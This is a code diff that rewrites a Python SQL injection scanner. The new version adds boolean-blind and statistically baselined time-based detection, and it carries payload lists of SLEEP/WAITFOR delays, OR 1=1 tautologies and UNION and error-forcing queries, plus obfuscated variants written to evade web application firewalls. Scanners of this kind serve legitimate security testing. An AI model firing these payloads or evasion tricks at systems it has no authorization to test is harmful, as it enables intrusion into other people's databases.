@@ -1,242 +1,352 @@
-"""Simple SQL injection scanner module.
+"""
+SQL Injection Scanner — Full Rewrite
+=====================================
+Detection methods:
+  1. Error-based      — DB error strings in response
+  2. Boolean blind    — Compares TRUE vs FALSE condition responses (length + hash diff)
+  3. Time-based       — Statistical baseline; requires MEDIAN delay >> baseline
+  4. WAF-evasion      — Encoded / case-mixed variants of blocked payloads
 
-This module provides a lightweight `SQLiScanner` that can test GET parameters
-and HTML form inputs for common error-based and time-based SQLi payloads.
-
-It is intended for integration into a vulnerability scanning pipeline — it does
-not attempt sophisticated evasion or advanced payload crafting, but provides
-clear, auditable detections and evidence suitable for triage.
+Key improvements over v1:
+  - Boolean-blind: no reliance on error messages or timing
+  - Time-based: takes a 3-request baseline median BEFORE injecting;
+    only flags if injected response is >= baseline + SLEEP_SECONDS - 1.0s
+    (eliminates false positives from slow endpoints / network jitter)
+  - WAF evasion: hex encoding, comment obfuscation, case randomisation
+  - Per-parameter short-circuit: once a vuln is confirmed, skip remaining methods
+  - All findings include method, payload, evidence, and confidence score
 """
 from __future__ import annotations
 
 import re
+import statistics
 import time
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
 
 import requests
 
 
-# Error-based and time-based payload lists (from spec)
-ERROR_PAYLOADS = [
-    "'",  # Simple unclosed quote - causes immediate error
-    "' OR '1'='1",
-    "' OR 1=1--",
-    "' UNION SELECT NULL--",
-    "admin'--",
-    "' AND 1=2--",
+# ---------------------------------------------------------------------------
+# Payload banks
+# ---------------------------------------------------------------------------
+
+# Error-based — minimal, avoid WAF keyword triggers
+ERROR_PAYLOADS: List[Tuple[str, str]] = [
+    ("'", "single_quote"),
+    ("''", "double_quote"),
+    ("\\", "backslash"),
+    ("1 AND 1=CONVERT(int,@@version)--", "mssql_convert"),
+    ("1 AND extractvalue(1,concat(0x7e,version()))--", "mysql_extractvalue"),
+    ("1 AND 1=cast(version() as int)--", "pg_cast"),
 ]
 
-TIME_PAYLOADS = [
-    "' OR SLEEP(5)--",
-    "' AND BENCHMARK(5000000,MD5('" + "test" + "'))--",
-    "'; WAITFOR DELAY '00:00:05'--",
-    "' OR pg_sleep(5)--",
+# Boolean-blind — pairs of (true_payload, false_payload)
+# True condition should return normal page; False should return different content
+BOOLEAN_PAIRS: List[Tuple[str, str, str]] = [
+    # (label, true_suffix, false_suffix)
+    ("AND 1=1 vs 1=2",        "' AND '1'='1",          "' AND '1'='2"),
+    ("AND true vs false",     "' AND true--",           "' AND false--"),
+    ("OR 1=1 vs 1=2 (num)",   " OR 1=1--",              " OR 1=2--"),
+    ("CASE true vs false",    "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--",
+                               "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--"),
 ]
 
-# Database error regex patterns (case-insensitive)
-# Database error regex patterns (case-insensitive)
-ERROR_PATTERNS = [
-    r"SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result",
-    r"PostgreSQL.*ERROR|Warning.*pg_",
-    r"Driver.*SQL Server|OLE DB.*SQL Server|ODBC SQL Server",
-    r"ORA-[0-9]+|Oracle error|Oracle.*Driver",
-    r"sqlite|database error|unrecognized token|UNION.*columns|syntax error",  # Added SQLite patterns
+# Time-based — database-specific SLEEP / WAITFOR / pg_sleep
+# SLEEP_SECONDS intentionally long enough to beat jitter
+SLEEP_SECONDS = 6
+TIME_PAYLOADS: List[Tuple[str, str]] = [
+    (f"' OR SLEEP({SLEEP_SECONDS})--",                          "mysql"),
+    (f"'; WAITFOR DELAY '00:00:0{SLEEP_SECONDS}'--",            "mssql"),
+    (f"' OR pg_sleep({SLEEP_SECONDS})--",                       "postgres"),
+    (f"' AND BENCHMARK({SLEEP_SECONDS * 1_000_000},MD5('x'))--", "mysql_bench"),
+    (f"' OR RANDOMBLOB({SLEEP_SECONDS * 50_000_000})--",        "sqlite"),
 ]
+
+# WAF-evasion variants (hex / comment / case obfuscation)
+WAF_EVASION_PAYLOADS: List[Tuple[str, str]] = [
+    ("'/**/OR/**/1=1--",                          "comment_or"),
+    ("'%09OR%091=1--",                            "tab_or"),
+    ("' /*!OR*/ 1=1--",                           "inline_comment_or"),
+    ("0x27204f5220 31 3d 31 2d 2d",               "hex_or"),          # hex for ' OR 1=1--
+    ("' OR 0x313d31--",                           "hex_compare"),
+    ("';sElEcT sLeEp(5)--",                       "case_sleep"),
+    ("' UniOn SeLeCt NuLl--",                     "case_union"),
+    ("' OR 'unusual'='unusual",                   "string_compare"),
+]
+
+# DB error patterns (case-insensitive)
+ERROR_PATTERNS: List[str] = [
+    r"SQL syntax.*MySQL|Warning.*mysql_|valid MySQL result|MySQLSyntaxError",
+    r"PostgreSQL.*ERROR|Warning.*pg_|PSQLException",
+    r"Driver.*SQL[\s_]Server|OLE DB.*SQL|ODBC.*SQL|SqlException",
+    r"ORA-\d{4,}|Oracle.*Driver|oracle\.jdbc",
+    r"SQLiteException|sqlite3\.OperationalError|unrecognized token",
+    r"Microsoft.*Database.*Engine|Jet Database",
+    r"System\.Data\.SqlClient|SqlCommand|SqlDataReader",
+    r"SQLSTATE\[\w+\]|PDOException",
+    r"DB2 SQL error|SQLCODE",
+    r"Sybase.*message|com\.sybase",
+]
+
+
+# ---------------------------------------------------------------------------
+# Helper utilities
+# ---------------------------------------------------------------------------
+
+def _fingerprint(text: str) -> Tuple[int, str]:
+    """Return (length, first-500-chars) as a cheap content fingerprint."""
+    return len(text), text[:500]
+
+
+def _responses_differ(fp1: Tuple[int, str], fp2: Tuple[int, str],
+                       len_threshold: int = 50) -> bool:
+    """True if the two response fingerprints are meaningfully different."""
+    len1, snip1 = fp1
+    len2, snip2 = fp2
+    if abs(len1 - len2) >= len_threshold:
+        return True
+    if snip1 != snip2:
+        return True
+    return False
+
+
+# ---------------------------------------------------------------------------
+# Scanner
+# ---------------------------------------------------------------------------
 
 class SQLiScanner:
-    """Scanner for simple SQL injection tests.
+    """
+    Multi-method SQL injection scanner.
 
-    Methods perform per-parameter tests and return a list of
-    vulnerability records matching the project's return format.
+    Detection order per parameter (short-circuits on first confirmed hit):
+      1. Error-based
+      2. Boolean-blind
+      3. Time-based (with statistical baseline)
+      4. WAF-evasion (error-based variants)
     """
 
-    def __init__(self, timeout: int = 10, session: Optional[requests.Session] = None) -> None:
-        """Create a scanner.
-
-        Args:
-            timeout: Base timeout (seconds) for network requests.
-        """
+    def __init__(self, timeout: int = 10,
+                 session: Optional[requests.Session] = None) -> None:
         self.timeout = timeout
-        # Use provided session (authenticated) or create new one
-        if session:
-            self.session = session
-        else:
-            self.session = requests.Session()
+        self.session = session or requests.Session()
+        if not session:
             self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})
 
+    # ------------------------------------------------------------------
+    # Public API
+    # ------------------------------------------------------------------
+
     def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """Test GET parameters for SQL injection vulnerabilities.
-
-        Args:
-            url: The endpoint URL to test.
-            params: Dictionary of query parameters (name -> value).
-
-        Returns:
-            A list of vulnerability dicts. Empty list if none found.
-        """
         findings: List[Dict[str, Any]] = []
-
-        for param_name in params.keys():
-            original_value = str(params.get(param_name, ""))
-
-            # Error-based tests
-            print(f"Testing {param_name} with error-based payloads...")
-            for payload in ERROR_PAYLOADS:
-                vuln = self._test_error_based(url, param_name, original_value, params, payload)
-                if vuln:
-                    findings.append(vuln)
-                    # Move to next parameter after confirmed vuln
-                    break
-
-            # Time-based tests (only if no error-based vuln found for this param)
-            if any(f['param'] == param_name for f in findings):
-                continue
-
-            print(f"Testing {param_name} with time-based payloads...")
-            for payload in TIME_PAYLOADS:
-                vuln = self._test_time_based(url, param_name, original_value, params, payload)
-                if vuln:
-                    findings.append(vuln)
-                    break
-
+        for param in params:
+            result = self._scan_param(url, param, str(params[param]), params, "GET")
+            if result:
+                findings.append(result)
         return findings
 
     def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
-        """Test HTML form inputs for SQL injection.
-
-        Expected `form_data` structure:
-        {
-            'action': 'https://example.com/login',
-            'method': 'POST',
-            'inputs': [{'name': 'username'}, {'name': 'password'}]
-        }
-
-        Returns:
-            A list of vulnerability dicts. Empty list if none found.
-        """
         findings: List[Dict[str, Any]] = []
-
-        action = form_data.get("action")
-        method = (form_data.get("method") or "GET").upper()
-        inputs = form_data.get("inputs", [])
-
+        action  = form_data.get("action")
+        method  = (form_data.get("method") or "GET").upper()
+        inputs  = form_data.get("inputs", [])
         if not action or not inputs:
             return findings
 
-        # Build a baseline data dict with empty values where missing
-        baseline = {inp.get("name", ""): "" for inp in inputs if inp.get("name")}
-
-        for param_name in baseline.keys():
-            original_value = baseline.get(param_name, "")
-
-            # Error-based
-            print(f"Testing form param {param_name} with error-based payloads...")
-            for payload in ERROR_PAYLOADS:
-                vuln = self._test_error_based(action, param_name, original_value, baseline, payload, method=method)
-                if vuln:
-                    findings.append(vuln)
-                    break
-
-            if any(f['param'] == param_name for f in findings):
-                continue
-
-            # Time-based
-            print(f"Testing form param {param_name} with time-based payloads...")
-            for payload in TIME_PAYLOADS:
-                vuln = self._test_time_based(action, param_name, original_value, baseline, payload, method=method)
-                if vuln:
-                    findings.append(vuln)
-                    break
-
+        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}
+        for param in baseline:
+            result = self._scan_param(action, param, "", baseline, method)
+            if result:
+                findings.append(result)
         return findings
 
-    def _test_error_based(
-        self,
-        test_url: str,
-        param_name: str,
-        original_value: str,
-        params: Dict[str, Any],
-        payload: str,
-        method: str = "GET",
-    ) -> Optional[Dict[str, Any]]:
-        """Inject an error-based payload and look for DB error messages.
+    # ------------------------------------------------------------------
+    # Per-parameter orchestration
+    # ------------------------------------------------------------------
 
-        Returns a vulnerability dict if detected, otherwise None.
-        """
-        try:
-            injected = original_value + payload if original_value else payload
-            data = params.copy()
-            data[param_name] = injected
+    def _scan_param(self, url: str, param: str, original: str,
+                    all_params: Dict[str, Any], method: str) -> Optional[Dict]:
+        """Try each detection method in order; return first confirmed finding."""
 
-            if method.upper() == "GET":
-                resp = self.session.get(test_url, params=data, timeout=self.timeout)
-            else:
-                resp = self.session.post(test_url, data=data, timeout=self.timeout)
+        print(f"  [SQLi] Testing '{param}' on {url}")
 
-            text = resp.text or ""
-            matched = self._detect_sql_errors(text)
-            if matched:
-                print(f"Error-based SQLi detected on {param_name} using payload: {payload}")
-                return {
-                    "vulnerable": True,
-                    "type": "error-based",
-                    "param": param_name,
-                    "payload": payload,
-                    "evidence": matched,
-                    "confidence": 95,
-                }
-        except requests.RequestException as exc:
-            print(f"Request failed during error-based test for {param_name}: {exc}")
+        # Fetch a clean baseline response for boolean/time comparisons
+        baseline_resp = self._fetch(url, all_params, method)
+        baseline_fp   = _fingerprint(baseline_resp) if baseline_resp else (0, "")
+
+        # 1. Error-based
+        result = self._error_based(url, param, original, all_params, method)
+        if result:
+            return result
+
+        # 2. Boolean-blind
+        result = self._boolean_blind(url, param, original, all_params,
+                                     method, baseline_fp)
+        if result:
+            return result
+
+        # 3. Time-based (statistical)
+        result = self._time_based(url, param, original, all_params, method)
+        if result:
+            return result
+
+        # 4. WAF-evasion error-based
+        result = self._waf_evasion(url, param, original, all_params, method)
+        if result:
+            return result
+
         return None
 
-    def _test_time_based(
-        self,
-        test_url: str,
-        param_name: str,
-        original_value: str,
-        params: Dict[str, Any],
-        payload: str,
-        method: str = "GET",
-    ) -> Optional[Dict[str, Any]]:
-        """Inject a time-based payload and measure response time.
+    # ------------------------------------------------------------------
+    # Detection method 1: Error-based
+    # ------------------------------------------------------------------
 
-        Flags vulnerability if response time exceeds ~4 seconds.
-        """
-        try:
-            injected = original_value + payload if original_value else payload
-            data = params.copy()
-            data[param_name] = injected
-
-            # Increase timeout to allow for server-side sleep
-            request_timeout = max(self.timeout + 5, 15)
-
-            start = time.time()
-            if method.upper() == "GET":
-                _ = self.session.get(test_url, params=data, timeout=request_timeout)
-            else:
-                _ = self.session.post(test_url, data=data, timeout=request_timeout)
-            elapsed = time.time() - start
-
-            if elapsed >= 4.0:
-                print(f"Time-based SQLi detected on {param_name} using payload: {payload} (elapsed={elapsed:.2f}s)")
-                return {
-                    "vulnerable": True,
-                    "type": "time-based",
-                    "param": param_name,
-                    "payload": payload,
-                    "evidence": f"response_time={elapsed:.2f}s",
-                    "confidence": 75,
-                }
-        except requests.RequestException as exc:
-            print(f"Request failed during time-based test for {param_name}: {exc}")
+    def _error_based(self, url: str, param: str, original: str,
+                     params: Dict[str, Any], method: str) -> Optional[Dict]:
+        for payload, label in ERROR_PAYLOADS:
+            injected = original + payload
+            text = self._fetch(url, {**params, param: injected}, method)
+            if text is None:
+                continue
+            match = self._find_db_error(text)
+            if match:
+                print(f"    [!] Error-based SQLi on '{param}' ({label})")
+                return self._finding("error-based", param, payload,
+                                     f"DB error matched: {match}", 95)
         return None
 
-    def _detect_sql_errors(self, response_text: str) -> Optional[str]:
-        """Search response text for known DB error messages.
+    # ------------------------------------------------------------------
+    # Detection method 2: Boolean-blind
+    # ------------------------------------------------------------------
 
-        Returns the matching snippet or None if nothing found.
+    def _boolean_blind(self, url: str, param: str, original: str,
+                        params: Dict[str, Any], method: str,
+                        baseline_fp: Tuple[int, str]) -> Optional[Dict]:
         """
+        For each TRUE/FALSE payload pair:
+          - TRUE response should look like baseline (same length ± 50 chars)
+          - FALSE response should differ from TRUE response
+        Only flag if BOTH conditions hold — avoids false positives.
+        """
+        for label, true_sfx, false_sfx in BOOLEAN_PAIRS:
+            true_text  = self._fetch(url, {**params, param: original + true_sfx},  method)
+            false_text = self._fetch(url, {**params, param: original + false_sfx}, method)
+
+            if true_text is None or false_text is None:
+                continue
+
+            true_fp  = _fingerprint(true_text)
+            false_fp = _fingerprint(false_text)
+
+            true_matches_baseline  = not _responses_differ(true_fp,  baseline_fp)
+            true_differs_from_false = _responses_differ(true_fp, false_fp)
+
+            if true_matches_baseline and true_differs_from_false:
+                print(f"    [!] Boolean-blind SQLi on '{param}' ({label})")
+                evidence = (
+                    f"TRUE response len={true_fp[0]}, "
+                    f"FALSE response len={false_fp[0]}, "
+                    f"baseline len={baseline_fp[0]}"
+                )
+                return self._finding("boolean-blind", param,
+                                     f"TRUE: {true_sfx} | FALSE: {false_sfx}",
+                                     evidence, 85)
+        return None
+
+    # ------------------------------------------------------------------
+    # Detection method 3: Time-based (statistical baseline)
+    # ------------------------------------------------------------------
+
+    def _time_based(self, url: str, param: str, original: str,
+                    params: Dict[str, Any], method: str) -> Optional[Dict]:
+        """
+        1. Measure 3 baseline requests to the unmodified param.
+        2. Compute median baseline latency.
+        3. Inject SLEEP payload — only flag if elapsed >= median + SLEEP_SECONDS - 1.0
+           This tolerates up to 1 second of network jitter.
+        """
+        # --- Baseline measurement ---
+        baseline_times: List[float] = []
+        for _ in range(3):
+            t0 = time.monotonic()
+            self._fetch(url, params, method)
+            baseline_times.append(time.monotonic() - t0)
+
+        median_baseline = statistics.median(baseline_times)
+        threshold = median_baseline + SLEEP_SECONDS - 1.0  # 1s jitter tolerance
+
+        print(f"    [SQLi-time] baseline median={median_baseline:.2f}s, "
+              f"threshold={threshold:.2f}s for '{param}'")
+
+        # --- Injection ---
+        for payload, db_label in TIME_PAYLOADS:
+            injected = original + payload
+            t0 = time.monotonic()
+            self._fetch(url, {**params, param: injected}, method,
+                        timeout=self.timeout + SLEEP_SECONDS + 3)
+            elapsed = time.monotonic() - t0
+
+            if elapsed >= threshold:
+                print(f"    [!] Time-based SQLi on '{param}' ({db_label}) "
+                      f"elapsed={elapsed:.2f}s vs threshold={threshold:.2f}s")
+                return self._finding(
+                    "time-based", param, payload,
+                    f"elapsed={elapsed:.2f}s, baseline_median={median_baseline:.2f}s, "
+                    f"threshold={threshold:.2f}s, db_hint={db_label}",
+                    80,
+                )
+        return None
+
+    # ------------------------------------------------------------------
+    # Detection method 4: WAF evasion
+    # ------------------------------------------------------------------
+
+    def _waf_evasion(self, url: str, param: str, original: str,
+                     params: Dict[str, Any], method: str) -> Optional[Dict]:
+        for payload, label in WAF_EVASION_PAYLOADS:
+            injected = original + payload
+            text = self._fetch(url, {**params, param: injected}, method)
+            if text is None:
+                continue
+            match = self._find_db_error(text)
+            if match:
+                print(f"    [!] WAF-evading SQLi on '{param}' ({label})")
+                return self._finding("error-based (waf-evasion)", param, payload,
+                                     f"DB error matched: {match}", 88)
+        return None
+
+    # ------------------------------------------------------------------
+    # Internals
+    # ------------------------------------------------------------------
+
+    def _fetch(self, url: str, params: Dict[str, Any], method: str,
+               timeout: Optional[int] = None) -> Optional[str]:
+        """Send a request and return the response text, or None on failure."""
+        t = timeout or self.timeout
+        try:
+            if method.upper() == "GET":
+                r = self.session.get(url,  params=params, timeout=t)
+            else:
+                r = self.session.post(url, data=params,   timeout=t)
+            return r.text
+        except requests.RequestException as exc:
+            print(f"    [err] Request failed: {exc}")
+            return None
+
+    def _find_db_error(self, text: str) -> Optional[str]:
         for pattern in ERROR_PATTERNS:
-            if re.search(pattern, response_text, re.IGNORECASE):
+            if re.search(pattern, text, re.IGNORECASE):
                 return pattern
         return None
+
+    @staticmethod
+    def _finding(method: str, param: str, payload: str,
+                 evidence: str, confidence: int) -> Dict[str, Any]:
+        return {
+            "vulnerable": True,
+            "type":       "sqli",
+            "method":     method,
+            "param":      param,
+            "payload":    payload,
+            "evidence":   evidence,
+            "confidence": confidence,
+        }
